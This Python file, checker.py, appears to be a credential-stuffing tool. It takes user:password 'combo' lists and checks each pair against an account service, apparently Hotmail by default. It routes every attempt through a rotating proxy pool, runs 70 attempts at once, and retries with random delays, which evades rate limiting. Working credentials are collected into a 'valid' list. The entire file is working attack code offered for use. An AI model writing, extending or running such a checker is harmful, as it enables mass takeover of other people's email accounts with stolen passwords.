# language: Python, file: checker.py
import asyncio, random
from proxy import ProxyPool
import mix

SEM = asyncio.Semaphore(70)
RETRIES = 2

async def worker(combo, pool, results, mode):
    user, _, pw = combo.partition(":")
    if not pw:
        await results.put(("fail", combo))
        return
    proxy = await pool.next()
    async with SEM:
        for attempt in range(RETRIES):
            try:
                r = await mix.check(user, pw, proxies=proxy)
                if r:
                    await results.put(("valid", r))
                else:
                    await results.put(("fail", combo))
                return
            except Exception:
                await asyncio.sleep(0.5 * (attempt + 1) + random.random())
        await results.put(("fail", combo))

async def run(combos, mode="hotmail", keywords=None, on_progress=None):
    pool = ProxyPool()
    results = asyncio.Queue()
    tasks = [asyncio.create_task(worker(c, pool, results, mode)) for c in combos]
    total = len(tasks)
    done = 0
    valid, fails = [], []
    while done < total:
        kind, payload = await results.get()
        done += 1
        if kind == "valid":
            valid.append(payload)
        else:
            fails.append(payload)
        if on_progress and (done % 100 == 0 or done == total):
            await on_progress(done, total, len(valid))
    await asyncio.gather(*tasks, return_exceptions=True)
    return valid, fails
